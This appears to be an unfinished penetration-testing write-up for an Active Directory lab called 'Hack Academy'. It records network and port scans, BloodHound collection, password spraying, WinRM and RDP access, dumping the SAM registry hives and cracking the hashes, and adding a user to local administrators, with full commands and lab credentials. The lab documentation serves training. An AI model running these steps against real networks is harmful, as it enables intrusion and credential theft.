# Report - ADChain_01 - Hack Academy

- Author: Henry Post
- Targets: DC01, Client1, Client2
- Target IP: 10.0.2.4, 10.0.2.7, 10.0.2.9
- Attacker IP: 10.0.2.15
- Date: 07/09/2026

## Executive Summary



### Recommendations

1. a
2. b
3. c

## Resources

- resource1
- github link
- medium link
- exploit-db link

## Recon

```sh
┌──(kali㉿kali)-[~]
└─$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.2.1        0.0.0.0         UG    100    0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ip route
default via 10.0.2.1 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 

```

We're on the same LAN as our victim.

```sh
netexec smb 10.0.2.0/24
```

```c
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

So, we have DC01, CLIENT-1, and CLIENT-2. And their IPs.

```sh
echo '10.0.2.4' > ips
echo '10.0.2.9' >> ips
echo '10.0.2.7' >> ips
```

Now for a port scan.

```sh
nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt
```


```sh
Nmap scan report for 10.0.2.4
Host is up (0.00032s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
58930/tcp open  unknown
58940/tcp open  unknown
58952/tcp open  unknown
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.9
Host is up (0.00030s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
49668/tcp open  unknown
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.7
Host is up (0.00033s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
49668/tcp open  unknown
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 3 IP addresses (3 hosts up) scanned in 171.15 seconds
           Raw packets sent: 393574 (17.317MB) | Rcvd: 430 (18.872KB)

```


```sh
nmap -Pn -iL ips -sV -sC -v -oN nmap_sVsC.txt
```

```sh
Nmap scan report for 10.0.2.4
Host is up (0.00027s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-09 18:54:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:40:1a:93 (Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   HACK-ACADEMY<00>     Flags: <group><active>
|   HACK-ACADEMY<1c>     Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|_  HACK-ACADEMY<1b>     Flags: <unique><active>
|_clock-skew: 1h59m58s
| smb2-time: 
|   date: 2026-07-09T18:54:07
|_  start_date: N/A

Nmap scan report for 10.0.2.9
Host is up (0.00032s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-2
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-2.hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-09T16:54:07+00:00
| ssl-cert: Subject: commonName=Client-2.hack-academy.local
| Issuer: commonName=Client-2.hack-academy.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-07T18:47:19
| Not valid after:  2027-01-06T18:47:19
| MD5:     067f 1e6e c349 8ace 7f31 cb72 1a0c 38cb
| SHA-1:   5033 8e06 48ba 41b8 fe52 86bc 6d83 f51c dfbf 6eac
|_SHA-256: b992 ec55 dad4 0d35 8345 d279 4200 6ed7 938b d08f 4993 b19e 4d72 b600 c038 3c68
|_ssl-date: 2026-07-09T16:54:48+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6c:31:cf (Oracle VirtualBox virtual NIC)
| Names:
|   CLIENT-2<00>         Flags: <unique><active>
|   HACK-ACADEMY<00>     Flags: <group><active>
|_  CLIENT-2<20>         Flags: <unique><active>
| smb2-time: 
|   date: 2026-07-09T16:54:08
|_  start_date: N/A

Nmap scan report for 10.0.2.7
Host is up (0.00032s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Client-1.hack-academy.local
| Issuer: commonName=Client-1.hack-academy.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-07T18:47:12
| Not valid after:  2027-01-06T18:47:12
| MD5:     3324 83d7 5d08 26ee 8ba9 2076 ee6e dc2c
| SHA-1:   f6a3 b094 32e3 e622 30e4 dea9 3953 8290 1891 1d19
|_SHA-256: 83f6 3ce0 1ce4 ecac 9d27 2bb9 ceb5 f598 b35a cd4c f73a 7144 eac6 c963 2cef 1d40
|_ssl-date: 2026-07-09T16:54:48+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-1
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-1.hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-09T16:54:08+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:1d:57 (Oracle VirtualBox virtual NIC)
| Names:
|   CLIENT-1<00>         Flags: <unique><active>
|   HACK-ACADEMY<00>     Flags: <group><active>
|_  CLIENT-1<20>         Flags: <unique><active>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-09T16:54:08
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     10.0.2.9
|_    10.0.2.7
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 59.18 seconds
           Raw packets sent: 5991 (263.556KB) | Rcvd: 35 (1.492KB)


```
...

In the meantime, let's pull some BloodHound data.

```sh
sudo apt update

sudo apt install docker-compose docker.io

sudo groupadd docker

sudo usermod -aG docker $USER

newgrp docker

curl -L https://ghst.ly/getbhce -o docker-compose.yml

docker-compose pull && docker-compose up -d

docker-compose logs bloodhound | grep -i passw
# admin
# Qqwwra7CGfcmnkJ_f3sKan8pkAgMkLMN

# visit http://localhost:8080/
```

Okay. Note to self: Kali needs more RAM.

Now to pull data for BloodHound to ingest.

```sh
netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --bloodhound --collection All --dns-server 10.0.2.4
```

NOTE: I had to edit this file and disable BHCE.

```
nano /home/kali/.nxc/nxc.conf
```

Now we upload the .zip file. to BH.

Next, let's grab all the usernames from SMB.

```sh
netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users

<<EOF
Administrator
Guest
krbtgt
mjohnson
lbennett
egreen
spatel
dreyes
nflores
clee
otran
zmiller
mross
twest
eknight
mthompson
EOF
```

If we just run `netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users`, we notice that we have a credential - `HappyCactus$10`.

```sh
rm pass || echo "no pass file"
echo 'HappyCactus$10' >> pass
echo '!!reiD123' >> pass
```

## Non-root access

Now we can password spray on SMB and RDP. :)

```sh
netexec smb ips -u users -p pass --continue-on-success

<<EOF
SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\lbennett:!!reiD123 
SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\twest:HappyCactus$10 
SMB         10.0.2.7        445    CLIENT-1         [+] hack-academy.local\lbennett:!!reiD123 
SMB         10.0.2.7        445    CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 
SMB         10.0.2.4        445    DC01             [+] hack-academy.local\lbennett:!!reiD123 
SMB         10.0.2.4        445    DC01             [+] hack-academy.local\twest:HappyCactus$10 

EOF
```

RDP:

```sh
netexec rdp ips -u users -p pass --continue-on-success

<<WOOMY
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\lbennett:!!reiD123 
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\twest:HappyCactus$10 
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\lbennett:!!reiD123 
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 
WOOMY
```

WinRM:

```sh
netexec winrm ips -u users -p pass --continue-on-success

<<OWO
WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 (Pwn3d!)
OWO
```

Good stuff, WinRM is an outlier.

Now let's examine `lbennett` in BloodHound.

We should mark `lbennett` and `twest` as owned in BH.

If we search for Domain Admins in Cypher pre-existing queries, we notice that "MTHOMPSON" is a domain admin...hmmmmm...

Another useful query is "Shortest paths from Owned objects".

We can also check "AS-REP".

It's also useful to check "Kerberoastable members of Tier Zero / High Value groups".

Another one is "Principals with DCSync privileges".

(We find nothing interesting from BH)

Note that BloodHound data comes from a domain controller, so its accuracy is only scoped to that.

So, we know we can WinRM onto CLIENT-1 (10.0.2.7) with `twest`...Let's do it!

```sh
evil-winrm -i 10.0.2.7 -u twest -p 'HappyCactus$10'
```

We're in.

If we run `whoami /all`, we can see that we have `SeBackupPrivilege` and we're part of the "Remote Management Users" group. We will abuse this.

If we were on a DC, we could dump password hashes, but sadly we're on a client.

```powershell
cd c:\
mkdir temp
cd temp
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system

# now we can use evil-winrm's download feature

download sam
download system
```

Now, on Kali, we can get those sweet sweet hashes.

```sh
impacket-secretsdump -system system -sam sam local

<<UWU

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbacf965a2426afda3d2207e4d6aa3904
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::

UWU
```

Save the hashes to `hashes_local_Client-1_10.0.2.7.txt` with `gedit`. We only care about the `Matt` and `Administrator` hashes.

Let's crack!

```sh
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes_local_Client-1_10.0.2.7.txt 


# Password1!       (Matt)     

echo 'Password1!' >> pass
```

Note that Matt isn't a domain user, it's a local user.

But perhaps his password can be useful.

It's important to note that we need to use `--local-auth` or else this won't work. Because Matt isn't on the domain.

```sh
netexec smb ips -u Matt -p 'Password1!' --local-auth

<<EOF

success...

SMB         10.0.2.7        445    CLIENT-1         [+] CLIENT-1\Matt:Password1! 

EOF
```

Now to check RDP.

```sh
netexec rdp ips -u Matt -p 'Password1!' --local-auth

<<RDPSTDOUT


RDP         10.0.2.7        3389   CLIENT-1         [+] CLIENT-1\Matt:Password1! (Pwn3d!)

RDPSTDOUT

```

Matt can RDP on CLIENT-1. Let's try it.

```sh

xfreerdp3 /v:10.0.2.7 /u:matt /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
```

Inside RDP, let's run:

```sh
whoami /all
```

Looks like we're an admin as Matt. Yay :)

Let's pop an admin shell on CLIENT-1.

```sh
net localgroup "administrators" twest /add
```

Now, back in Kali, if we run:

```sh
netexec smb ips -u twest -p 'HappyCactus$10'
```

We should notice that `netexec` says "pwned". This is because we added ourselves to a local admin group.

Because we have admin, now we can dump hashes remotely using `netexec`.

```sh
netexec smb ips -u twest -p 'HappyCactus$10' --sam
```




## Root access

tbd

## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
